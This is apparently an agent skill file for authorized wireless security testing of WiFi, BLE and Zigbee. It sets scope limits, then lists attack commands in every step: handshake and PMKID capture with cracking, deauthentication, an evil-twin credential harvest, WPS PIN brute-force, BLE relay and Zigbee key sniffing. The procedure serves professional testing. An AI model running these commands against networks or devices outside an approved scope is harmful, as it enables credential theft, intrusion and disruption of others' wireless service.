---
name: harness-wireless
description: "Test WiFi (WPA2/3, WPA-Enterprise, WPS), BLE, Zigbee, and wireless protocol security with bounded captures and controlled deauth."
---

# Wireless — WiFi, BLE, Zigbee, protocol analysis

Source: `testing-wifi`, `ble-security`, `zigbee-security` (2024: PMKID capture without deauth, WPA3-SAE dragonblood, BLE MITM via btlejuice, Zigbee key sniffing).

## Gate

Approved `SSID/BSSID/device` only. Every command via `cyber_process` `argv`. Bounded capture window (max 10 minutes). Deauth only on approved test network with no other users. Never jam, never disrupt production wireless. → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Wireless reconnaissance

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Scan for networks
sudo airodump-ng wlan0mon --output-format csv -w scan

# Target-specific capture
sudo airodump-ng wlan0mon --bssid TARGET_BSSID -c CHANNEL -w capture
```

Record: SSID, BSSID, channel, encryption (WPA2/WPA3/WEP/Open), cipher (CCMP/TKIP), auth (PSK/Enterprise), clients connected.

### 2. WPA2-PSK testing

**PMKID capture (no deauth needed):**
```bash
sudo hcxdumptool -i wlan0mon --filterlist_ap=target_bssid.txt --filtermode=2 --enable_status=1 -o capture.pcapng
hcxpcapngtool capture.pcapng -o hash.22000
hashcat -m 22000 hash.22000 wordlist.txt
```

**4-way handshake capture (requires client activity or approved deauth):**
```bash
# Capture
sudo airodump-ng wlan0mon --bssid TARGET -c CH -w handshake

# Approved deauth (test network only, max 3 frames)
sudo aireplay-ng -0 3 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Crack
aircrack-ng -w wordlist.txt handshake-01.cap
```

### 3. WPA3-SAE testing

- Check for SAE transition mode (WPA3+WPA2 mixed) → downgrade attack
- Dragonblood timing attack: `dragonslayer` tool
- Group downgrade: force weaker elliptic curve group

### 4. WPA-Enterprise testing

- Identify EAP type (PEAP, EAP-TLS, EAP-TTLS)
- Evil twin with `hostapd-mana` or `eaphammer`:
  ```bash
  eaphammer --bssid TARGET_BSSID --essid TARGET_SSID --channel CH --auth wpa-enterprise --creds
  ```
- Capture RADIUS credentials (MS-CHAPv2 → crack with `asleap`)
- Certificate validation: does the client accept any cert?

### 5. WPS testing

```bash
# Check if WPS is enabled
wash -i wlan0mon

# PIN brute-force (if WPS enabled and not locked)
reaver -i wlan0mon -b TARGET_BSSID -vv -K  # Pixie dust
reaver -i wlan0mon -b TARGET_BSSID -vv      # Online brute-force
```

### 6. BLE testing

```bash
# Scan for BLE devices
sudo hcitool lescan

# Enumerate services and characteristics
gatttool -b DEVICE_MAC -I
> connect
> primary
> characteristics

# Read/write characteristics
> char-read-hnd 0x0025
> char-write-req 0x0025 0100
```

Test:
- Pairing: is Just Works used? (no MITM protection)
- Authentication: can you read sensitive characteristics without pairing?
- Encryption: is link-layer encryption enforced?
- MITM: use `btlejuice` or `gattacker` for relay attack

### 7. Zigbee testing

```bash
# Capture with KillerBee
zbdump -f 15 -c zigbee_capture.pcap -w

# If default key (ZigBeeAlliance09)
zbgoodfind -f zigbee_capture.pcap
```

Test: key transport sniffing, replay attack, insecure rejoin.

### 8. Negative controls

- Control 1: legitimate client connects to the target network (positive control)
- Control 2: wrong password → connection rejected
- Control 3: deauth on a network with WPA3 management frame protection → no effect

## Proof contract

A finding needs: (1) identified wireless target and protocol, (2) captured credentials or demonstrated bypass, (3) reproduction, (4) three negative controls. A captured handshake is a lead — cracked PSK or accepted evil twin credential is a finding.

## Done

Each finding cites the target SSID/device, the protocol weakness, the captured evidence, and the negative controls. Pcap files are stored as evidence artifacts.
